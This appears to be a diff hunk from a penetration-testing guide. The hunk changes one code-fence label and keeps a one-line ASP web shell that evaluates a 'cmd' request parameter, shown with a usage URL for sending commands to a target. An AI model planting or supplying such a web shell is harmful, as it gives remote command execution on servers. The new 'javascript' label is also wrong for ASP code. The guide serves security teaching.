@@ -42,7 +42,7 @@ We can find many excellent web shells online that provide useful features, for e
 ```
 
 Sending it and then searching in the URL: `http://<target>/shell.php?cmd=<command>`. The same example for **.NET**:
-```asp
+```javascript
 <% eval request('cmd') %>
 ```
 
